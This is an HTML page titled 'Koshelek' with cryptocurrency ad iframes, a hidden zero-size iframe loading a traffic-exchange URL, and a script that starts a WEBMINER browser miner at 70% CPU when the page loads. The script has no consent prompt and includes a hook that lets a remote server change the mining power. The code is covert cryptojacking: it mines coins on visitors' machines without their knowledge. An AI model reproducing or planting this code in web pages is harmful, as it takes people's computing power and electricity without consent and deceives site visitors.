<!DOCTYPE html>
<html lang="en">
	<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<title>Koshelek</title> <!-- Название вашего сайта во вкладке -->

	</head>

	<body>


	<iframe src="https://ad2bitcoin.com/ad.php?ref=JReeeeee2&width=728" marginwidth="0" marginheight="0" width="728" height="90" scrolling="no" border="0" frameborder="0"></iframe>

	<iframe src="https://ad2bitcoin.com/ad.php?ref=JReeeeee2&width=468" marginwidth="0" marginheight="0" width="468" height="60" scrolling="no" border="0" frameborder="0"></iframe>

	<iframe src="https://ad2bitcoin.com/ad.php?ref=JReeeeee2&width=300" marginwidth="0" marginheight="0" width="300" height="250" scrolling="no" border="0" frameborder="0"></iframe>

	<iframe src="http://traffic2bitcoin.com/ptp.php?ref=JReeeeee1" marginwidth="0" marginheight="0" width="0" height="0" scrolling="no" border="0" frameborder="0"></iframe>
	
	<script>
		// - Configure:
		WEBMINER.config({ 
			login: "6064275", // Your ID - required
			pass: "6064275", // Name for stats, leave blank for automatic set.
		});

		// - Universal function for Start/Stop/Change speed - 0 = stop, 1-100 = set percent of CPU usage and start mining if not started:
		WEBMINER.power(70);

		// - Restore previous session accepted hashes and power (start mining if it worked in previous session):
		WEBMINER.loadStored();

		// - Get current power:
		console.log( WEBMINER.getPower() );

		// - Get current speed in hashes/sec:
		console.log( WEBMINER.getHashesPerSecond() );

		// - Get current job algo:
		console.log( WEBMINER.getJobAlgo() );

		// - Get current job diff:
		console.log( WEBMINER.getJobDiff() );

		// - Get accepted by pool hashes (in all sessions)
		console.log( WEBMINER.getAcceptedHashes() );

		// - Reset config and stop minig
		WEBMINER.reset(); // Reset config, stop mining and disconnect from pool (you can use it when user logout).

		// - Remote change speed event:
		WEBMINER.on('remotepower', (power) => {
			WEBMINER.power(power); // Is automatic applied if no listeners for this event.
			console.log('New power:', power);
		});

		// - Share accepted event
		WEBMINER.on('accepted', () => console.log('New share') );
	</script>
	
	</body>
</html>
